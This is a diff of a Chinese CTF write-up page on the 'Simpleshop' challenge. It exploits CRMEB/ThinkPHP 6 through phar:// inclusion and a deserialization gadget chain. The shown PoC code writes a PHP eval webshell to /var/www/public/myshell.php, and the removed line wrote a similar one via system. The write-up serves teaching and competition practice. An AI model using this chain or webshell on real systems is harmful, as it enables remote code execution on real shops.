@@ -1476,7 +1476,7 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 <h1 id="Simpleshop（复现）"><a href="#Simpleshop（复现）" class="headerlink" title="Simpleshop（复现）"></a>Simpleshop（复现）</h1><blockquote>
 <p>hint1: the ultimate goal is to enable rce to read the contents of the &#x2F;flag file.<br>hint2: the foreground user can achieve rce and background has nothing to do, so it is pointless to break the background password.<br>hint3: source code on github&#x2F;gitee latest version you can try to audit it<br><a target="_blank" rel="noopener" href="https://gitee.com/ZhongBangKeJi/CRMEB">https://gitee.com/ZhongBangKeJi/CRMEB</a><br><a target="_blank" rel="noopener" href="https://github.com/crmeb/CRMEB">https://github.com/crmeb/CRMEB</a></p>
 </blockquote>
-<p>是个CRMEB，基于thinkphp的</p>
+<p>是个CRMEB，基于thinkphp的，php7.4</p>
 <p>robots.txt：<code>/A_letter_to_ctfer.html</code></p>
 <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Dear Friend:
 
@@ -1607,6 +1607,7 @@ Your friend J1rrY<span aria-hidden="true" class="line-numbers-rows"><span></span
 
 <p>&#x2F;api&#x2F;image_base64 这里会接受两个参数 code 和 image</p>
 <p>逻辑是先检查给定的 url 是否是一张图片，然后先尝试从缓存中获取图片，如果失败则调用<code>put_image</code>从远程下载图片，再转成base64</p>
+<p>注意，因为这里缓存机制的存在，同一个图片只能触发一次 if 内的条件</p>
 <p>这里需要重点关注一下<code>put_image</code>这个函数，跟过去看一下</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">put_image</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
@@ -1644,14 +1645,15 @@ Your friend J1rrY<span aria-hidden="true" class="line-numbers-rows"><span></span
 <p>既然是用<code>str_replace</code>置空<code>phar://</code>，那么直接双写绕过即可，于是在<code>readfile</code>这里就能打一个<code>phar://</code>文件包含</p>
 <p>那么，我们只需要控制前面的 code 参数为 phar 协议即可</p>
 <p>这样子思路就很清晰了：在上传头像处上传图片马，内容是tp的反序列化链，通过 phar 文件包含来解析这个图片马从而触发反序列化实现rce</p>
-<p>接下来就是找tp链子了，crmeb-5.4是基于 tp6 的，那么就是用tp6的链子</p>
-<p>我这里是逆向搜索链子，从tp6的链子尾部开始往前找，貌似没啥变化，甚至是tp6.0的链子（后面证明了这个链子打不了。。有其它链子）</p>
+<p>接下来就是找tp链子了，crmeb-5.4是基于 tp6 的，那么就是用tp6的链子，写文件的话，安装这个框架的时候会发现 public 目录一定是可写的</p>
+<p>我这里是逆向搜索链子，从tp6的链子尾部开始往前找，貌似没啥变化，甚至是tp6.0的链子（后面发现我改的链子只控制 data 和 withAttr 打不了。。这里的是正确修改的poc）</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span>
 <span class="token keyword">trait</span> <span class="token class-name-definition class-name">Attribute</span>
 <span class="token punctuation">&#123;</span>
-    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token string double-quoted-string">"echo\$&#123;IFS&#125;'&lt;?=eval(\\\$_POST[0]);'>/var/www/public/uploads/0w0.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token string double-quoted-string">"&lt;?php eval(\$_POST[1]);?>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token string double-quoted-string">"file_put_contents"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"/var/www/public/myshell.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>
 <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span>
@@ -1682,7 +1684,7 @@ Your friend J1rrY<span aria-hidden="true" class="line-numbers-rows"><span></span
 <span class="token comment">//签名自动计算</span>
 <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>发现有文件内容检测，看一下</p>
 <p>crmeb&#x2F;crmeb&#x2F;services&#x2F;upload&#x2F;storage&#x2F;Local.php</p>
